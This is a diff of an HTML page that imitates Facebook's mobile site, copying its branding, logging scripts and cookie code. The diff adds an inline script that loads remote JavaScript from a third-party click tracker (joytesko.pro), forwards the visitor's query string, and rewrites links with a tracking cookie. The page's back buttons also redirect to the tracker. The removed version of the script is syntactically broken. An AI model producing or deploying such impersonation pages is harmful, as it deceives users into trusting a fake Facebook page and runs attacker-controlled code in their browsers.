@@ -317,33 +317,33 @@
   </head>
   <body>
     <script>
-      function getUclick() {
-          var e = document.cookie.match(new RegExp("(?:^|; )uclick=([^;]*)"));
-          return e ? decodeURIComponent(e[1]) : void 0
-      }
-
-      function fxOfLnks() {
-          var e = getUclick();
-          if (void 0 === e) return !1;
-          for (var n = document.getElementsByTagName("a"), t = 0; t < n.length; t++) {
-              var i = n[t].getAttribute("href");
-              "string" == typeof i && (-1 == i.indexOf("&event") && -1 == i.indexOf("?event") && -1 == i.indexOf("?lp=1") && -1 == i.indexOf("?lp=data_upd") && -1 == i.indexOf("?cnv_id=OPTIONAL") || (n[t].href = i + "&uclick=" + e))
+          function getUclick() {
+              var e = document.cookie.match(new RegExp("(?:^|; )uclick=([^;]*)"));
+              return e ? decodeURIComponent(e[1]) : void 0
           }
-      }
 
-      function sendLpPixel() {
-          var e = window.location.search;
-          0 === e.indexOf("?") && (e = e.substr(1, e.length));
-          var n = "https://play.google.com/store/apps/details?id=com.webcamnchat.nearme" 
-              t = document.createElement("script");
-          t.async = !1, t.src = n, document.head.appendChild(t), t.onload = function() {
-          window.lp_pixel_wait_flag = !1, "loading" === document.readyState ? (document.addEventListener("DOMContentLoaded", fxOfLnks), "function" == typeof window.lp_pixel_callback && document.addEventListener("DOMContentLoaded", function() {
-                  window.lp_pixel_callback(window.tokens)
-              })) : (fxOfLnks(), "function" == typeof window.lp_pixel_callback && window.lp_pixel_callback(window.tokens))
+          function fxOfLnks() {
+              var e = getUclick();
+              if (void 0 === e) return !1;
+              for (var n = document.getElementsByTagName("a"), t = 0; t < n.length; t++) {
+                  var i = n[t].getAttribute("href");
+                  "string" == typeof i && (-1 == i.indexOf("&event") && -1 == i.indexOf("?event") && -1 == i.indexOf("?lp=1") && -1 == i.indexOf("?lp=data_upd") && -1 == i.indexOf("?cnv_id=OPTIONAL") || (n[t].href = i + "&uclick=" + e))
+              }
           }
-      }
-      sendLpPixel();
-      </script>
+
+          function sendLpPixel() {
+              var e = window.location.search;
+              0 === e.indexOf("?") && (e = e.substr(1, e.length));
+              var n = "https://joytesko.pro/click.php?key=91ze7g3jkov6tcs9xb1s&lp_type=pixel&to_lander=1" + (e ? "&" + e : ""),
+                  t = document.createElement("script");
+              t.async = !1, t.src = n, document.head.appendChild(t), t.onload = function() {
+              window.lp_pixel_wait_flag = !1, "loading" === document.readyState ? (document.addEventListener("DOMContentLoaded", fxOfLnks), "function" == typeof window.lp_pixel_callback && document.addEventListener("DOMContentLoaded", function() {
+                      window.lp_pixel_callback(window.tokens)
+                  })) : (fxOfLnks(), "function" == typeof window.lp_pixel_callback && window.lp_pixel_callback(window.tokens))
+              }
+          }
+          sendLpPixel();
+          </script>
       </body>
   <script id="u_0_73y">CavalryLogger=window.CavalryLogger||function(a){this.lid=a,this.transition=!1,this.metric_collected=!1,this.is_detailed_profiler=!1,this.instrumentation_started=!1,this.pagelet_metrics={},this.events={},this.ongoing_watch={},this.values={t_cstart:window._cstart},this.piggy_values={},this.bootloader_metrics={},this.resource_to_pagelet_mapping={},this.initializeInstrumentation&&this.initializeInstrumentation()},CavalryLogger.prototype.setIsDetailedProfiler=function(a){this.is_detailed_profiler=a;return this},CavalryLogger.prototype.setTTIEvent=function(a){this.tti_event=a;return this},CavalryLogger.prototype.setValue=function(a,b,c,d){d=d?this.piggy_values:this.values;(typeof d[a]==="undefined"||c)&&(d[a]=b);return this},CavalryLogger.prototype.getLastTtiValue=function(){return this.lastTtiValue},CavalryLogger.prototype.setTimeStamp=CavalryLogger.prototype.setTimeStamp||function(a,b,c,d){this.mark(a);var e=this.values.t_cstart||this.values.t_start;e=d?e+d:CavalryLogger.now();this.setValue(a,e,b,c);this.tti_event&&a==this.tti_event&&(this.lastTtiValue=e,this.setTimeStamp("t_tti",b));return this},CavalryLogger.prototype.mark=typeof console==="object"&&console.timeStamp?function(a){console.timeStamp(a)}:function(){},CavalryLogger.prototype.addPiggyback=function(a,b){this.piggy_values[a]=b;return this},CavalryLogger.instances={},CavalryLogger.id=0,CavalryLogger.disableArtilleryOnUntilOffLogging=!1,CavalryLogger.getInstance=function(a){typeof a==="undefined"&&(a=CavalryLogger.id);CavalryLogger.instances[a]||(CavalryLogger.instances[a]=new CavalryLogger(a));return CavalryLogger.instances[a]},CavalryLogger.setPageID=function(a){if(CavalryLogger.id===0){var b=CavalryLogger.getInstance();CavalryLogger.instances[a]=b;CavalryLogger.instances[a].lid=a;delete CavalryLogger.instances[0]}CavalryLogger.id=a},CavalryLogger.now=function(){return window.performance&&performance.timing&&performance.timing.navigationStart&&performance.now?performance.now()+performance.timing.navigationStart:new Date().getTime()},CavalryLogger.prototype.measureResources=function(){},CavalryLogger.prototype.profileEarlyResources=function(){},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){},CavalryLogger.start_js=function(){},CavalryLogger.done_js=function(){};CavalryLogger.getInstance().setTTIEvent("t_domcontent");CavalryLogger.prototype.measureResources=function(a,b){if(!this.log_resources)return;var c="bootload/"+a.name;if(this.bootloader_metrics[c]!==void 0||this.ongoing_watch[c]!==void 0)return;var d=CavalryLogger.now();this.ongoing_watch[c]=d;"start_"+c in this.bootloader_metrics||(this.bootloader_metrics["start_"+c]=d);b&&!("tag_"+c in this.bootloader_metrics)&&(this.bootloader_metrics["tag_"+c]=b);if(a.type==="js"){c="js_exec/"+a.name;this.ongoing_watch[c]=d}},CavalryLogger.prototype.stopWatch=function(a){if(this.ongoing_watch[a]){var b=CavalryLogger.now(),c=b-this.ongoing_watch[a];this.bootloader_metrics[a]=c;var d=this.piggy_values;a.indexOf("bootload")===0&&(d.t_resource_download||(d.t_resource_download=0),d.resources_downloaded||(d.resources_downloaded=0),d.t_resource_download+=c,d.resources_downloaded+=1,d["tag_"+a]=="_EF_"&&(d.t_pagelet_cssload_early_resources=b));delete this.ongoing_watch[a]}return this},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){var a={};Object.values(window.CavalryLogger.instances).forEach(function(b){b.bootloader_metrics&&Object.assign(a,b.bootloader_metrics)});return a},CavalryLogger.start_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("js_exec/"+a[b])},CavalryLogger.done_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("bootload/"+a[b])},CavalryLogger.prototype.profileEarlyResources=function(a){for(var b=0;b<a.length;b++)this.measureResources({name:a[b][0],type:a[b][1]?"js":""},"_EF_")};CavalryLogger.getInstance().log_resources=true;CavalryLogger.getInstance().setIsDetailedProfiler(true);window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_start");</script><script id="u_0_73z">(function _(a,b,c,d){function e(a){document.cookie=a+"=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"}function f(a,b){document.cookie=a+"="+b+";path=/;domain=.facebook.com;secure"}if(!a){e(b);e(c);return}a=null;(navigator.userAgent.indexOf("Firefox")!==-1||!window.devicePixelRatio&&navigator.userAgent.indexOf("Windows Phone")!==-1)&&(document.documentElement!=null&&(a=screen.width/document.documentElement.offsetWidth,a=Math.max(1,Math.floor(a*2)/2)));(!a||a===1)&&navigator.userAgent.indexOf("IEMobile")!==-1&&(a=Math.sqrt(screen.deviceXDPI*screen.deviceYDPI)/96,a=Math.max(1,Math.round(a*2)/2));f(b,(a||window.devicePixelRatio||1).toString());e=window.screen?screen.width:0;b=window.screen?screen.height:0;f(c,e+"x"+b);d&&document.cookie&&window.devicePixelRatio>1&&document.location.reload()})(true, "m_pixel_ratio", "wd", false);</script><meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" /><link rel="manifest" href="/data/manifest/" crossorigin="use-credentials" /></head><body tabindex="0" class="touch x2 _fzu _50-3 _67i4 iframe _2v9s"><script id="u_0_73x">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script>
     <div id="viewport" id=disable_bl data-kaios-focus-transparent="1"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page" class=""><div class="_129_" id="header-notices"></div><div class="_52z5 _451a mFuturePageHeader _1uh1 titled" id=disable_bl> <div class="_7om2 _52we"><div class="_5s61"><div class="_52z7"><a role="button" class="backButton btn btnI bgb mfss touchable iconOnly" href="https://joytesko.pro/click.php?lp=1" aria-label="&#x41d;&#x430;&#x437;&#x430;&#x434;" id="u_0_73p" data-sigil="back-button"><i class="img sp_udj6ValC6cM_2x sx_7ba432" style="margin-top: 2px;"></i></a></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title">Facebook</div></div></div><div class="_5s61"><div class="_52z8"><a role="button" class="backButton _k6r btn btnI bgb mfss touchable iconOnly" aria-hidden="true" href="https://joytesko.pro/click.php?lp=1" aria-label="&#x41d;&#x430;&#x437;&#x430;&#x434;" id="u_0_73q" data-sigil="back-button"><i class="img sp_udj6ValC6cM_2x sx_7ba432" style="margin-top: 2px;"></i></a></div></div></div></div><div id="m:chrome:schedulable-graph-search"></div><div id="rootcontainer"><div class="_2v9s" id="root" role="main" data-sigil="context-layer-root content-pane"><div class="_7om2"><div class="_4g34 _33nt" style="background-color: #FFFFFF" id="u_0_2qo">
